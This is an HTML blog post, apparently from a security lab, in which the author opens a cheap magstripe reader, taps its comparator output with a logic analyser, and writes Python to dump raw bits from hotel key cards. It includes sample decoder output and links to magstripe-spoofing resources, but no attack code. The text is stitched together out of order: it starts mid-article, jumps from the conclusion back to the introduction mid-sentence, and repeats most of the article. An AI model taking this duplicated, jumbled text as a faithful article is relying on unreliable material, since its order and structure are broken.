+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chips1.png" alt="image-6486">
+                   </div></a><p class="wp-caption-text">2 x Op Amps</p></div>
+<div id="attachment_6524" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6487"><div class="lb-album"><a href="#image-6487"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chips2-300x123.jpg" alt="Analogue Comparator (left); STM32 Microcontroller (right)" class="size-medium wp-image-6524"><span></span></a></div>              
+<a href="#imageclose-6487" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6487">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chips2.jpg" alt="image-6487">
+                   </div></a><p class="wp-caption-text">Analogue Comparator (left); STM32 Microcontroller (right)</p></div>
+<p>These chips were responsible for amplifying the signal from the read head. So if hooked up to the output of each, I might see a signal I could use to determine the data on the magstripes. I use the datasheets to identify the output pins of each IC.</p>
+<p>The output from the 2 x Op Amps was about 0.5 &#8211; 0.6v peak-to-peak. Easily viewable using my scope, but I&#8217;d be unable to feed this into my logic analyser. I&#8217;d need about 3v peak-to-peak for that. The signal was also quite scruffy looking. Not the nice square wave I&#8217;d hoped for.</p>
+<p>The output from the analogue comparator was exactly what I was after. A nice 3 or 4v peak-to-peak square wave that appeared only when I swiped a card. There were 4 outputs from the comparator. One never produced a signal. This seemed reasonable for a read head that could read 3-track magstripes. Time to feed this into the logic analyser and start figuring what constituted a 0 or 1&#8230;</p>
+<h2>1&#8242;s and 0&#8242;s</h2>
+<p>Progress had been quite fast up to this point. This was shaping up to be an interesting project.</p>
+<p>Here&#8217;s the output from the comparator viewed in the Saleae Logic software:</p>
+<div id="attachment_6525" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6488"><div class="lb-album"><a href="#image-6488"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/square-300x69.png" alt="Comparator output viewed via logic analyser" class="size-medium wp-image-6525"><span></span></a></div>              
+<a href="#imageclose-6488" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6488">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/square.png" alt="image-6488">
+                   </div></a><p class="wp-caption-text">Comparator output viewed via logic analyser</p></div>
+<p>Note that we&#8217;re only seeing 1 square wave, not 3. This is because this particular card only has data on 1 of the 3 tracks.</p>
+<p>So we have a signal to analyse, but we don&#8217;t have 1&#8242;s and 0&#8242;s yet.</p>
+<p><a title="Phrack37" http://phrack.org/issues/37/6.html#article">Phrack37</a> from 1992 helps us with that:</p>
+<div id="attachment_6527" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6489"><div class="lb-album"><a href="#image-6489"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/10-300x147.png" alt="ASCII art explanation of how 1' class="size-medium wp-image-6527"><span></span></a></div>              
+<a href="#imageclose-6489" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6489">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/10.png" alt="image-6489">
+                   </div></a><p class="wp-caption-text">ASCII art explanation of how 1&#8242;s and 0&#8242;s are encoded on a magstripe</p></div>
+<p>Essentially a 0 and 1 are both the same length when encoded. A 1 changed state half way through and a 0 doesn&#8217;t. Note that the 0 can be either high or low.</p>
+<p>Rather than decode the 1&#8242;s and 0&#8242;s by eye, I wrote a Python script that parsed the exported data from the logic analyzer and dumped the 1&#8242;s and o&#8217;s. Here&#8217;s the format used by &#8220;Logic&#8221; (the Saleae software) when exporting to CSV:</p>
+<div id="attachment_6528" style="width: 287px" class="wp-caption alignnone"><a name="imageclose-6490"><div class="lb-album"><a href="#image-6490"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/csv-277x300.png" alt="Format used in CSV export from Saleae' class="size-medium wp-image-6528"><span></span></a></div>              
+<a href="#imageclose-6490" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6490">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/csv.png" alt="image-6490">
+                   </div></a><p class="wp-caption-text">Format used in CSV export from Saleae&#8217;s Logic software</p></div>
+<p>The Python code turned out to be a pain to write because the baud rate of the data wasn&#8217;t constant. It varies depending on how fast the card is moving past the read head. I took a few wrong turns when coding this up, but eventually found a solution that worked.</p>
+<p>Here&#8217;s a scatter graph that shows that the duration of square wave pulse doesn&#8217;t have exactly 2 values as expected. Instead a wide range of values are seen. It&#8217;s still possible to tell 0&#8242;s (long pulses, green dots) from 1&#8242;s (short pulses, blue/purple dots) &#8211; see top graph. The ratio of each successive pulse to the last was a better way to tell o&#8217;s from 1&#8242;s &#8211; see bottom graph:</p>
+<div id="attachment_6530" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6491"><div class="lb-album"><a href="#image-6491"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/example-graph-300x218.png" alt="Graph showing how much pulse duration (delta) takes a range of values, not just two as expected" class="size-medium wp-image-6530"><span></span></a></div>              
+<a href="#imageclose-6491" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6491">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/example-graph.png" alt="image-6491">
+                   </div></a><p class="wp-caption-text">Graph showing how much pulse duration (delta) takes a range of values, not just two as expected</p></div>
+<h2>And finally, the bytes / characters</h2>
+<p>This is where my problems started. My whole life, bits have made bytes. Specifically they&#8217;ve made 8-bit bytes. This is not the case on magstripes, it turned out.</p>
+<p>As mentioned in the phrack paper, credit cards use 2 tracks, one where characters are composed of 5 bits (4 bits + 1 parity) and another where characters are composed of 7 bits (6 bits + 1 parity).</p>
+<p>I spent quite a bit of time coding up a decoder for credit cards. Partly because I needed to be assured that I&#8217;d read the 1&#8242;s and o&#8217;s correctly and partly because I thought I&#8217;d need the code to see if the same character types were used in hotel cards.</p>
+<p>One of the challenges in coding this up was knowing where the data started and the preamble ended. It seems that &#8220;sentinels&#8221; are used to mark the start/end of the data. These are special characters (bit patterns) that readers can look for at the start and end of a stripe&#8230; then it made sense. This is why the card reader only worked for credit cards!  The firmware is looking for the sentinels used by credit cards. It can&#8217;t decode the hotel cards because it&#8217;s not obvious where the data starts or ends; or what constitutes a character. Also, perhaps lack a valid <a title="Longitudinal Redundancy Check (LRC)" href="https://en.wikipedia.org/wiki/Longitudinal_redundancy_check">Longitudinal Redundancy Check (LRC)</a>.</p>
+<h2>Identifying characters on hotel magstripes</h2>
+<p>I ran my credit-card code over the hotel mag stripes to see if there was odd parity with all the 5 bit chunks or all the 7 bit chunks. No, unfortunately not. Another reason the cheap magstripe reader probably failed.</p>
+<p>Then I ran some frequency analysis on the 1&#8242;s and 0&#8242;s. Maybe a lot of the 5-bit chunks are all the same value?  Or the 7-bit chunks?  I&#8217;d see something similar on the credit card magstripe. There were 20 spaces on the 7-bit magstripe. So, using frequency analysis, I should have been able to guess 7-bit characters were being used.</p>
+<p>By splitting some of the hotels magstripe data into 8-bit chunks, we notice that the same string of 1&#8242;s and 0&#8242;s occurs many more times than you&#8217;d expect. So my best guess is that 8-bit characters are used.</p>
+<p>Below is some example output from my Python script. Not that it outputs:</p>
+<ul>
+<li>Raw bits</li>
+<li>Strings (with hex dumps) that would be right if 5-bit, 6-bit, 7-bit or 8-bit characters were used. Though &#8220;correctness&#8221; depends on parity, bit order and what character set the bit values map to. Plenty of room for error and improvement here</li>
+<li>Checks for odd/even parity within characters</li>
+<li>Frequency analysis looking for common characters &#8211; for varying character lengths</li>
+</ul>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+[+] Parsing file export.csv
+ [-] Flips in channel 0: 3
+ [-] Flips in channel 1: 1652
+ [-] Flips in channel 2: 3
+[+] Analysing swipes
+ [-] Channel 0:
+ [-] Channel 1:
+ [-] Swipe 0: 693 bits
+ [-] Swipe 1: 701 bits
+ [-] Channel 2:
+[+] Creating Plots
+ [-] creating plots with dimensions (1637, 1637), (1637, 1637)
+ [-] saving plot to file: export.csv-plot-channel-1.png
+----------------------- CHANNEL 1 SWIPE 0 -----------------------
+[+] Length (bits) = 266 (%5 = 1, %6 = 2, %7 = 0, % 8= 2)
+[+] Data: 10100110001001100010011000100110001001100010011000100110001001100010011000100110001001100101011011100110101001001101100110100110001001100111110110111100111101100010000000100110011001101100001010010101001001001110110100000111001101011101100001100101101000101010011001
+[+] Strings:
+ [-] 5 bit: 5398621&lt;4398621&lt;43:&gt;62&lt;3539&lt;;&gt;&lt;=409&lt;615549=1&gt;6&gt;36=1:6
+ [-] length: 53
+ [-] hex: 
+ 35 33 39 38 36 32 31 3c 34 33 39 38 36 32 31 3c 5398621&lt;4398621&lt;
+ 34 33 3a 3e 36 32 3c 33 35 33 39 3c 3b 3e 3c 3d 43:&gt;62&lt;3539&lt;;&gt;&lt;=
+ 34 30 39 3c 36 31 35 35 34 39 3d 31 3e 36 3e 33 409&lt;615549=1&gt;6&gt;3
+ 36 3d 31 3a 36 6=1:6
+[-] 6 bit: E(1C&amp;amp;,9RD(1CFM92;+1S;G;&quot;D,-**DMPLW8M4,
+ [-] length: 38
+ [-] hex: 
+ 45 28 31 43 26 2c 39 52 44 28 31 43 46 4d 39 32 E(1C&amp;amp;,9RD(1CFM92
+ 3b 2b 31 53 3b 47 3b 22 44 2c 2d 2a 2a 44 4d 50 ;+1S;G;&quot;D,-**DMP
+ 4c 57 38 4d 34 2c LW8M4,
+[-] 7 bit: %..#...2$..#&amp;amp;-.....3.'..$....$-0,7.-.
+ [-] length: 37
+ [-] hex: 
+ 25 08 11 23 06 0c 19 32 24 08 11 23 26 2d 19 12 %..#...2$..#&amp;amp;-..
+ 1b 0b 11 33 1b 27 1b 02 24 0c 0d 0a 0a 24 2d 30 ...3.'..$....$-0
+ 2c 37 18 2d 14 ,7.-.
+[-] 8 bit: .&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;V....&amp;amp;}.. &amp;amp;f..$..5.e..@
+ [-] length: 34
+ [-] hex: 
+ a6 26 26 26 26 26 26 26 26 26 26 56 e6 a4 d9 a6 .&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;V....
+ 26 7d bc f6 20 26 66 c2 95 24 ed 07 35 d8 65 a2 &amp;amp;}.. &amp;amp;f..$..5.e.
+ a6 40 .@
+[+] Parity for 5 bit chars: odd: False, even: False)
+[+] Parity for 6 bit chars: odd: False, even: False)
+[+] Parity for 7 bit chars: odd: False, even: False)
+[+] Parity for 8 bit chars: odd: False, even: False)
+[+] Frequency analysis for potential char lengths:
+ [-] 5 bits:
+ 10011: 5
+ 11000: 4
+ 01100: 4
+ 00110: 4
+ 00100: 4
+ [-] 6 bits:
+ 100110: 5
+ 100010: 5
+ 011000: 5
+ 011001: 4
+ 001001: 4
+ [-] 7 bits:
+ 1000100: 3
+ 0010011: 3
+ 1101100: 2
+ 1100010: 2
+ 1011010: 2
+ [-] 8 bits:
+ 00100110: 12 &lt; common 8-bit patter implies 8-bit chars?
+ 10100110: 3
+...snip...
+</pre>
+<p>The above data is from an actual hotel card (though the hotel as since switched to using RFID locks).</p>
+<p>I also started to look at XORing, rotating of characters (rot13 style), bit order and offsetting the whole stream of bits (in case I started at the wrong place when  chunk the character up). All to no avail as yet.</p>
+<p>That&#8217;s as far as I got. I&#8217;ll be sure to post again if I ever decode any of the data on the card. I was hoping to see my room number and checkout date in cleartext. But equally an opaque encrypted string wouldn&#8217;t surprise me either &#8211; which could be what I&#8217;m seeing on at least some of the cards.</p>
+<h2>Conclusion</h2>
+<p>Doing things the cheap and time-consuming way can be fun &#8211; and a good opportunity to write code, learn about <a title="matplotlib" href="https://matplotlib.org/">matplotlib</a> and dust off the logic analyser.</p>
+<h2>Further reading/viewing</h2>
+<p>If you want to know more about magstripes (before they become completely obsolete), take a look at:</p>
+<ul>
+<li><a title="Samy Kamkar's magspoof tool" href="https://samy.pl/magspoof/">Samy Kamkar&#8217;s magspoof tool</a> (<a title="video link" href="https://www.youtube.com/watch?v=UHSFf0Lz1qc">video link</a>) &#8211; could be useful if you need your PC to transmit bad data in through a magnetic read head.</li>
+<li><a title="DEF CON 24 - Weston Hecker - Hacking Hotel Keys and Point of Sale Systems" href="https://www.youtube.com/watch?v=mV_0k9Fh590">DEF CON 24 &#8211; Weston Hecker &#8211; Hacking Hotel Keys and Point of Sale Systems</a></li>
+</ul>
+<p>I was pretty inspired by these projects.In this post I describe how my cheap magstripe reader wouldn&#8217;t read all magstripes, only credit/debit cards. This did nothing to help me understand what data was on my hotel key card &#8211; which is what I really wanted to know. Rather than take the obvious next step or buying a better reader, I opted to open up the cheap magstripe reader, probed around a bit and found a way to read the raw data off the hotel magstripes. What that data means remains a mystery so there may be a part 2 at some stage.<!--more--></p>
+<h2>About my magstripe reader</h2>
+<p>I bought the following reader for £11.85 in 2017:</p>
+<div id="attachment_6519" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6482"><div class="lb-album"><a href="#image-6482"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/myreader1-300x254.png" alt="Cheap reader from eBay" class="size-medium wp-image-6519"><span></span></a></div>              
+<a href="#imageclose-6482" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6482">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/myreader1.png" alt="image-6482">
+                   </div></a><p class="wp-caption-text">Cheap reader from eBay</p></div>
+<p>It connects via USB and is detected as a keyboard. If you swipe a credit/debit card through the reader, the corresponding data from the magstripe will appear if your text editor as if it had been typed. If you don&#8217;t have a text editor open at the time, you&#8217;ll get the effect of whatever the keystrokes on the magstripe reader are!</p>
+<p>It works fine under both Windows and Linux. But only for credit/debit cards. When I swiped a hotel key card through, I got no data at all.</p>
+<h2>Why not just get a different reader?</h2>
+<p>I could have taken a couple of different (and no doubt better) approaches to this project. Finding a better magstripe reader was one option. Googling around to better understand hotel magstripes would have no-doubt been fruitful, but potentially spoils some of problem solving. I can always google later when I&#8217;m properly stuck. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<p>I since invested in an MSR605X reader/writer. I haven&#8217;t played with it much yet, but it is able to do raw reads. I&#8217;ll probably cover this reader in a future post.</p>
+<h2>Plan for the cheap reader</h2>
+<p>I figured that the magnetic read head in the cheap reader would almost certainly be able to read the data from from hotel cards or any other card with a magstripe. But the rest of the reader was only able to interpret payment card data. If I could probe the electrical signals in the right place within the reader, I should be able to see the 1&#8242;s and 0&#8242;s on the magstripe.</p>
+<div id="attachment_6520" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6483"><div class="lb-album"><a href="#image-6483"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readhead-300x160.png" alt="Magnetic read head inside card reader" class="size-medium wp-image-6520"><span></span></a></div>              
+<a href="#imageclose-6483" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6483">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readhead.png" alt="image-6483">
+                   </div></a><p class="wp-caption-text">Magnetic read head inside card reader</p></div>
+<p>I was a vague plan and certainly not the path of least resistance, but would ultimately work&#8230;</p>
+<h2>Probing around</h2>
+<p>I had two tools at my disposal to probe with (this was a home-based side project as opposed to an office-based project):</p>
+<ul>
+<li>A cheap handheld Oscilloscope (Sainsmart DS202)</li>
+<li>A Saleae logic analyzer</li>
+</ul>
+<p>I quickly realized there were 7 points on the read head I could attach probes to.</p>
+<div id="attachment_6521" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6484"><div class="lb-album"><a href="#image-6484"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readheadback-300x149.png" alt="Connection points on back of read head" class="size-medium wp-image-6521"><span></span></a></div>              
+<a href="#imageclose-6484" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6484">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readheadback.png" alt="image-6484">
+                   </div></a><p class="wp-caption-text">Connection points on back of read head</p></div>
+<p>I figured if hooked the read head directly up to my scope, I&#8217;d be able to see an analogue signal when I swiped a card. Ultimately I hoped to do something with said signal to get the data I wanted.</p>
+<div id="attachment_6522" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6485"><div class="lb-album"><a href="#image-6485"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readheadsoldered-300x178.png" alt="Connections for scope soldered directly to read head" class="size-medium wp-image-6522"><span></span></a></div>              
+<a href="#imageclose-6485" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6485">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/readheadsoldered.png" alt="image-6485">
+                   </div></a><p class="wp-caption-text">Connections for scope soldered directly to read head</p></div>
+<p>I tried hooking up various pairs from these 7 probe points to my scope, but didn&#8217;t find any signal at all. Maybe the signal&#8217;s too weak, or maybe (in retrospect) I did a rubbish job of identifying a suitable ground.</p>
+<p>By this point I&#8217;d started googling the chip numbers. There were 2 x Op Amps and 1 x Analogue Comparator:</p>
+<ul>
+<li>2 x <a title="LM2902DG" href="https://www.mouser.co.uk/ProductDetail/ON-Semiconductor/LM2902DG">LM2902DG</a> (Op Amp)</li>
+<li>1 x <a title="LM2901DG" href="https://www.mouser.co.uk/ProductDetail/ON-Semiconductor/LM2901DG">LM2901DG</a> (Analogue Comparator)</li>
+</ul>
+<div id="attachment_6523" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6486"><div class="lb-album"><a href="#image-6486"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chips1-300x105.png" alt="2 x Op Amps" class="size-medium wp-image-6523"><span></span></a></div>              
+<a href="#imageclose-6486" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6486">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chips1.png" alt="image-6486">
+                   </div></a><p class="wp-caption-text">2 x Op Amps</p></div>
+<div id="attachment_6524" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6487"><div class="lb-album"><a href="#image-6487"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chips2-300x123.jpg" alt="Analogue Comparator (left); STM32 Microcontroller (right)" class="size-medium wp-image-6524"><span></span></a></div>              
+<a href="#imageclose-6487" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6487">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/chips2.jpg" alt="image-6487">
+                   </div></a><p class="wp-caption-text">Analogue Comparator (left); STM32 Microcontroller (right)</p></div>
+<p>These chips were responsible for amplifying the signal from the read head. So if hooked up to the output of each, I might see a signal I could use to determine the data on the magstripes. I use the datasheets to identify the output pins of each IC.</p>
+<p>The output from the 2 x Op Amps was about 0.5 &#8211; 0.6v peak-to-peak. Easily viewable using my scope, but I&#8217;d be unable to feed this into my logic analyser. I&#8217;d need about 3v peak-to-peak for that. The signal was also quite scruffy looking. Not the nice square wave I&#8217;d hoped for.</p>
+<p>The output from the analogue comparator was exactly what I was after. A nice 3 or 4v peak-to-peak square wave that appeared only when I swiped a card. There were 4 outputs from the comparator. One never produced a signal. This seemed reasonable for a read head that could read 3-track magstripes. Time to feed this into the logic analyser and start figuring what constituted a 0 or 1&#8230;</p>
+<h2>1&#8242;s and 0&#8242;s</h2>
+<p>Progress had been quite fast up to this point. This was shaping up to be an interesting project.</p>
+<p>Here&#8217;s the output from the comparator viewed in the Saleae Logic software:</p>
+<div id="attachment_6525" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6488"><div class="lb-album"><a href="#image-6488"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/square-300x69.png" alt="Comparator output viewed via logic analyser" class="size-medium wp-image-6525"><span></span></a></div>              
+<a href="#imageclose-6488" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6488">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/square.png" alt="image-6488">
+                   </div></a><p class="wp-caption-text">Comparator output viewed via logic analyser</p></div>
+<p>Note that we&#8217;re only seeing 1 square wave, not 3. This is because this particular card only has data on 1 of the 3 tracks.</p>
+<p>So we have a signal to analyse, but we don&#8217;t have 1&#8242;s and 0&#8242;s yet.</p>
+<p><a title="Phrack37" http://phrack.org/issues/37/6.html#article">Phrack37</a> from 1992 helps us with that:</p>
+<div id="attachment_6527" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6489"><div class="lb-album"><a href="#image-6489"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/10-300x147.png" alt="ASCII art explanation of how 1' class="size-medium wp-image-6527"><span></span></a></div>              
+<a href="#imageclose-6489" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6489">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/10.png" alt="image-6489">
+                   </div></a><p class="wp-caption-text">ASCII art explanation of how 1&#8242;s and 0&#8242;s are encoded on a magstripe</p></div>
+<p>Essentially a 0 and 1 are both the same length when encoded. A 1 changed state half way through and a 0 doesn&#8217;t. Note that the 0 can be either high or low.</p>
+<p>Rather than decode the 1&#8242;s and 0&#8242;s by eye, I wrote a Python script that parsed the exported data from the logic analyzer and dumped the 1&#8242;s and o&#8217;s. Here&#8217;s the format used by &#8220;Logic&#8221; (the Saleae software) when exporting to CSV:</p>
+<div id="attachment_6528" style="width: 287px" class="wp-caption alignnone"><a name="imageclose-6490"><div class="lb-album"><a href="#image-6490"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/csv-277x300.png" alt="Format used in CSV export from Saleae' class="size-medium wp-image-6528"><span></span></a></div>              
+<a href="#imageclose-6490" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6490">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/csv.png" alt="image-6490">
+                   </div></a><p class="wp-caption-text">Format used in CSV export from Saleae&#8217;s Logic software</p></div>
+<p>The Python code turned out to be a pain to write because the baud rate of the data wasn&#8217;t constant. It varies depending on how fast the card is moving past the read head. I took a few wrong turns when coding this up, but eventually found a solution that worked.</p>
+<p>Here&#8217;s a scatter graph that shows that the duration of square wave pulse doesn&#8217;t have exactly 2 values as expected. Instead a wide range of values are seen. It&#8217;s still possible to tell 0&#8242;s (long pulses, green dots) from 1&#8242;s (short pulses, blue/purple dots) &#8211; see top graph. The ratio of each successive pulse to the last was a better way to tell o&#8217;s from 1&#8242;s &#8211; see bottom graph:</p>
+<div id="attachment_6530" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6491"><div class="lb-album"><a href="#image-6491"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/example-graph-300x218.png" alt="Graph showing how much pulse duration (delta) takes a range of values, not just two as expected" class="size-medium wp-image-6530"><span></span></a></div>              
+<a href="#imageclose-6491" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6491">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/example-graph.png" alt="image-6491">
+                   </div></a><p class="wp-caption-text">Graph showing how much pulse duration (delta) takes a range of values, not just two as expected</p></div>
+<h2>And finally, the bytes / characters</h2>
+<p>This is where my problems started. My whole life, bits have made bytes. Specifically they&#8217;ve made 8-bit bytes. This is not the case on magstripes, it turned out.</p>
+<p>As mentioned in the phrack paper, credit cards use 2 tracks, one where characters are composed of 5 bits (4 bits + 1 parity) and another where characters are composed of 7 bits (6 bits + 1 parity).</p>
+<p>I spent quite a bit of time coding up a decoder for credit cards. Partly because I needed to be assured that I&#8217;d read the 1&#8242;s and o&#8217;s correctly and partly because I thought I&#8217;d need the code to see if the same character types were used in hotel cards.</p>
+<p>One of the challenges in coding this up was knowing where the data started and the preamble ended. It seems that &#8220;sentinels&#8221; are used to mark the start/end of the data. These are special characters (bit patterns) that readers can look for at the start and end of a stripe&#8230; then it made sense. This is why the card reader only worked for credit cards!  The firmware is looking for the sentinels used by credit cards. It can&#8217;t decode the hotel cards because it&#8217;s not obvious where the data starts or ends; or what constitutes a character. Also, perhaps lack a valid <a title="Longitudinal Redundancy Check (LRC)" href="https://en.wikipedia.org/wiki/Longitudinal_redundancy_check">Longitudinal Redundancy Check (LRC)</a>.</p>
+<h2>Identifying characters on hotel magstripes</h2>
+<p>I ran my credit-card code over the hotel mag stripes to see if there was odd parity with all the 5 bit chunks or all the 7 bit chunks. No, unfortunately not. Another reason the cheap magstripe reader probably failed.</p>
+<p>Then I ran some frequency analysis on the 1&#8242;s and 0&#8242;s. Maybe a lot of the 5-bit chunks are all the same value?  Or the 7-bit chunks?  I&#8217;d see something similar on the credit card magstripe. There were 20 spaces on the 7-bit magstripe. So, using frequency analysis, I should have been able to guess 7-bit characters were being used.</p>
+<p>By splitting some of the hotels magstripe data into 8-bit chunks, we notice that the same string of 1&#8242;s and 0&#8242;s occurs many more times than you&#8217;d expect. So my best guess is that 8-bit characters are used.</p>
+<p>Below is some example output from my Python script. Not that it outputs:</p>
+<ul>
+<li>Raw bits</li>
+<li>Strings (with hex dumps) that would be right if 5-bit, 6-bit, 7-bit or 8-bit characters were used. Though &#8220;correctness&#8221; depends on parity, bit order and what character set the bit values map to. Plenty of room for error and improvement here</li>
+<li>Checks for odd/even parity within characters</li>
+<li>Frequency analysis looking for common characters &#8211; for varying character lengths</li>
+</ul>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+[+] Parsing file export.csv
+ [-] Flips in channel 0: 3
+ [-] Flips in channel 1: 1652
+ [-] Flips in channel 2: 3
+[+] Analysing swipes
+ [-] Channel 0:
+ [-] Channel 1:
+ [-] Swipe 0: 693 bits
+ [-] Swipe 1: 701 bits
+ [-] Channel 2:
+[+] Creating Plots
+ [-] creating plots with dimensions (1637, 1637), (1637, 1637)
+ [-] saving plot to file: export.csv-plot-channel-1.png
+----------------------- CHANNEL 1 SWIPE 0 -----------------------
+[+] Length (bits) = 266 (%5 = 1, %6 = 2, %7 = 0, % 8= 2)
+[+] Data: 10100110001001100010011000100110001001100010011000100110001001100010011000100110001001100101011011100110101001001101100110100110001001100111110110111100111101100010000000100110011001101100001010010101001001001110110100000111001101011101100001100101101000101010011001
+[+] Strings:
+ [-] 5 bit: 5398621&lt;4398621&lt;43:&gt;62&lt;3539&lt;;&gt;&lt;=409&lt;615549=1&gt;6&gt;36=1:6
+ [-] length: 53
+ [-] hex: 
+ 35 33 39 38 36 32 31 3c 34 33 39 38 36 32 31 3c 5398621&lt;4398621&lt;
+ 34 33 3a 3e 36 32 3c 33 35 33 39 3c 3b 3e 3c 3d 43:&gt;62&lt;3539&lt;;&gt;&lt;=
+ 34 30 39 3c 36 31 35 35 34 39 3d 31 3e 36 3e 33 409&lt;615549=1&gt;6&gt;3
+ 36 3d 31 3a 36 6=1:6
+[-] 6 bit: E(1C&amp;amp;,9RD(1CFM92;+1S;G;&quot;D,-**DMPLW8M4,
+ [-] length: 38
+ [-] hex: 
+ 45 28 31 43 26 2c 39 52 44 28 31 43 46 4d 39 32 E(1C&amp;amp;,9RD(1CFM92
+ 3b 2b 31 53 3b 47 3b 22 44 2c 2d 2a 2a 44 4d 50 ;+1S;G;&quot;D,-**DMP
+ 4c 57 38 4d 34 2c LW8M4,
+[-] 7 bit: %..#...2$..#&amp;amp;-.....3.'..$....$-0,7.-.
+ [-] length: 37
+ [-] hex: 
+ 25 08 11 23 06 0c 19 32 24 08 11 23 26 2d 19 12 %..#...2$..#&amp;amp;-..
+ 1b 0b 11 33 1b 27 1b 02 24 0c 0d 0a 0a 24 2d 30 ...3.'..$....$-0
+ 2c 37 18 2d 14 ,7.-.
+[-] 8 bit: .&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;V....&amp;amp;}.. &amp;amp;f..$..5.e..@
+ [-] length: 34
+ [-] hex: 
+ a6 26 26 26 26 26 26 26 26 26 26 56 e6 a4 d9 a6 .&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;V....
+ 26 7d bc f6 20 26 66 c2 95 24 ed 07 35 d8 65 a2 &amp;amp;}.. &amp;amp;f..$..5.e.
+ a6 40 .@
+[+] Parity for 5 bit chars: odd: False, even: False)
+[+] Parity for 6 bit chars: odd: False, even: False)
+[+] Parity for 7 bit chars: odd: False, even: False)
+[+] Parity for 8 bit chars: odd: False, even: False)
+[+] Frequency analysis for potential char lengths:
+ [-] 5 bits:
+ 10011: 5
+ 11000: 4
+ 01100: 4
+ 00110: 4
+ 00100: 4
+ [-] 6 bits:
+ 100110: 5
+ 100010: 5
+ 011000: 5
+ 011001: 4
+ 001001: 4
+ [-] 7 bits:
+ 1000100: 3
+ 0010011: 3
+ 1101100: 2
+ 1100010: 2
+ 1011010: 2
+ [-] 8 bits:
+ 00100110: 12 &lt; common 8-bit patter implies 8-bit chars?
+ 10100110: 3
+...snip...
+</pre>
+<p>The above data is from an actual hotel card (though the hotel as since switched to using RFID locks).</p>
+<p>I also started to look at XORing, rotating of characters (rot13 style), bit order and offsetting the whole stream of bits (in case I started at the wrong place when  chunk the character up). All to no avail as yet.</p>
+<p>That&#8217;s as far as I got. I&#8217;ll be sure to post again if I ever decode any of the data on the card. I was hoping to see my room number and checkout date in cleartext. But equally an opaque encrypted string wouldn&#8217;t surprise me either &#8211; which could be what I&#8217;m seeing on at least some of the cards.</p>
+<h2>Conclusion</h2>
+<p>Doing things the cheap and time-consuming way can be fun &#8211; and a good opportunity to write code, learn about <a title="matplotlib" href="https://matplotlib.org/">matplotlib</a> and dust off the logic analyser.</p>
+<h2>Further reading/viewing</h2>
